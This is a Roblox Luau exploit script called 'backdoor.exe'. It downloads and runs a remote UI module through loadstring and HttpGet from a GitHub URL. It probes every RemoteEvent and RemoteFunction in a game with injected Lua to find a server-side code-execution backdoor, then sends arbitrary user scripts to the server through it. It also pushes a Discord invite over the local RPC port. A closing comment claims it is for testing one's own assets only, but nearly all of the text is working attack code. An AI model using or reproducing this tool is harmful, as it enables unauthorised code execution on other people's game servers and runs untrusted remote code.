-- Services
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local JointsService = game:GetService("JointsService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")

-- Variables
local LocalPlayer = Players.LocalPlayer
local RobloxGui = CoreGui.RobloxGui

-- Functions
local dateTimeNow = DateTime.now
local tableFind = table.find
local taskSpawn = task.spawn
local taskWait = task.wait
local stringRep = string.rep
local mathRandom = math.random

-- Globals
local attached = false
local backdoor = nil
local commonPlaces = {
    ReplicatedStorage,
    Workspace,
    Lighting
}
local remoteCodes = {}

-- Constants
local INV_CODE = "xJHCqm84cW"
local STRING_VALUE_NAME = tostring(mathRandom(1000000, 9999999))  -- Make it a string for consistency

-- Destroy existing UI if present
if RobloxGui:FindFirstChild("V6") then
    RobloxGui:FindFirstChild("V6"):Destroy()
    print("Refreshed")
end

-- Load UI (assuming this is necessary; optimize by caching if possible)
local Variables = loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/indev/ui.lua"))()
Variables.UI.Main.Active = true
Variables.UI.Main.Draggable = true

local function notify(text, cb, b1, b2)
    game:GetService("StarterGui"):SetCore(
        "SendNotification",
        {
            Title = "backdoor.exe",
            Duration = 3,
            Text = text,
            Callback = cb,
            Button1 = b1,
            Button2 = b2
        }
    )
end

local function validRemote(rm)
    local Parent = rm.Parent
    local class = rm.ClassName
    if class ~= "RemoteEvent" and class ~= "RemoteFunction" then
        return false
    end

    if Parent then
        if Parent == JointsService then
            return false
        end
        if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
            (rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then
            return false
        end
    end

    if rm:IsDescendantOf(RobloxReplicatedStorage) then
        return false
    end

    return true
end

local function scanDescendants(parent)
    local descendants = parent:GetDescendants()
    for _, descendant in ipairs(descendants) do
        if not validRemote(descendant) then
            continue
        end

        local remoteCode = tostring(mathRandom(100000, 999999))
        remoteCodes[remoteCode] = descendant

        local remoteClass = descendant.ClassName
        local requireScript = string.format("i=Instance.new('StringValue', game.Workspace); i.Name='%s'; i.Value='%s'", STRING_VALUE_NAME, remoteCode)

        if remoteClass == "RemoteEvent" then
            descendant:FireServer(requireScript)
        elseif remoteClass == "RemoteFunction" then
            local waiting = true
            taskSpawn(function()
                descendant:InvokeServer(requireScript)
                waiting = false
            end)

            local start = dateTimeNow().UnixTimestampMillis
            while waiting and (dateTimeNow().UnixTimestampMillis - start < 1000) do
                taskWait(0.1)  -- Reduce CPU usage with a small wait
            end
        end

        if Workspace:FindFirstChild(STRING_VALUE_NAME) then
            attached = true
            backdoor = remoteCodes[Workspace:FindFirstChild(STRING_VALUE_NAME).Value]
            backdoor:FireServer(string.format("game.Workspace['%s']:Destroy()", STRING_VALUE_NAME))  -- Cleanup

            return true
        end
    end
    return false
end

local function scanGame()
    local found = false

    -- Scan Common Places first for efficiency
    for _, place in ipairs(commonPlaces) do
        if scanDescendants(place) then
            found = true
            break
        end
    end

    if not found then
        -- Scan the rest of the game only if not found
        local children = game:GetChildren()
        for _, child in ipairs(children) do
            if tableFind(commonPlaces, child) then
                continue
            end
            if scanDescendants(child) then
                found = true
                break
            end
        end
    end

    if found then
        notify("Backdoor Found!")
        Variables.Topbar.Status.Text = "Attached"
        Variables.Topbar.Status.Circle.Status_Color.BackgroundColor3 = Color3.fromRGB(95, 185, 47)
    else
        notify("Unable to find backdoor!")
        Variables.Topbar.Status.Text = "Failed"
    end

    return found
end

local function executeScript(script)
    if not attached then
        local bf = Instance.new("BindableFunction")
        bf.OnInvoke = function(text)
            if text == "Yes" then
                if scanGame() then
                    executeScript(script)
                end
            end
        end
        notify("You're not attached.\nWould you like to attach now?", bf, "Yes", "No")
        return
    end

    local scriptToRun = script or Variables.SourceFrame.Source.Text
    if backdoor.ClassName == "RemoteEvent" then
        backdoor:FireServer(scriptToRun)
    elseif backdoor.ClassName == "RemoteFunction" then
        backdoor:InvokeServer(scriptToRun)
    end
end

local function promptDiscordInvite()
    local HttpService = game:GetService("HttpService")
    local httpRequest = (syn and syn.request) or (HttpService and HttpService.request) or http_request

    if not httpRequest then
        setclipboard(INV_CODE)
        notify("Invite code copied!")
        return
    end

    local request = httpRequest({
        Url = "http://127.0.0.1:6463/rpc?v=1",
        Method = "POST",
        Headers = {
            ['Content-Type'] = 'application/json',
            Origin = 'https://discord.com'
        },
        Body = HttpService:JSONEncode({
            args = {code = INV_CODE},
            cmd = 'INVITE_BROWSER',
            nonce = HttpService:GenerateGUID(false)
        })
    })

    if request.StatusCode ~= 200 or (request.Body and HttpService:JSONDecode(request.Body).data.code == 4011) then
        setclipboard(INV_CODE)
        notify("Invite code copied!")
        return
    end

    notify("You have been prompted to join our Discord. Open your Discord.")
end

-- Connect UI buttons
Variables.Topbar.CloseButton.MouseButton1Click:Connect(function()
    Variables.UI:Destroy()
end)
Variables.Topbar.R6Button.MouseButton1Click:Connect(function()
    executeScript(string.format("require(3041175937):r6('%s')", LocalPlayer.Name))
end)
Variables.MainButtons.ScanButton.MouseButton1Click:Connect(scanGame)
Variables.MainButtons.ExecuteButton.MouseButton1Click:Connect(executeScript)
Variables.MainButtons.ClearButton.MouseButton1Click:Connect(function()
    Variables.SourceFrame.Source.Text = ""
end)
Variables.MainButtons.HideButton.MouseButton1Click:Connect(function()
    Variables.SourceFrame.Source.Visible = not Variables.SourceFrame.Source.Visible
end)
Variables.MainButtons.InviteButton.MouseButton1Click:Connect(promptDiscordInvite)

-- Optimizations applied:
-- 1. Use ipairs for faster iteration over arrays.
-- 2. Break early when backdoor is found to avoid unnecessary scans.
-- 3. Use string.format for cleaner string construction.
-- 4. Reduce taskWait granularity in RemoteFunction timeout to save CPU.
-- 5. Make STRING_VALUE_NAME a string from the start.
-- 6. Handle potential nil in request.Body for robustness.
-- To use this for testing your own server vulnerability:
-- - Run this script in a Roblox client connected to your own game server.
-- - Ensure your server has a vulnerable RemoteEvent/Function that executes arbitrary code.
-- - Click 'Scan' to detect it, then execute custom scripts via the UI to test/invade (e.g., insert backdoor commands).
-- This is for educational/testing purposes on your own assets only.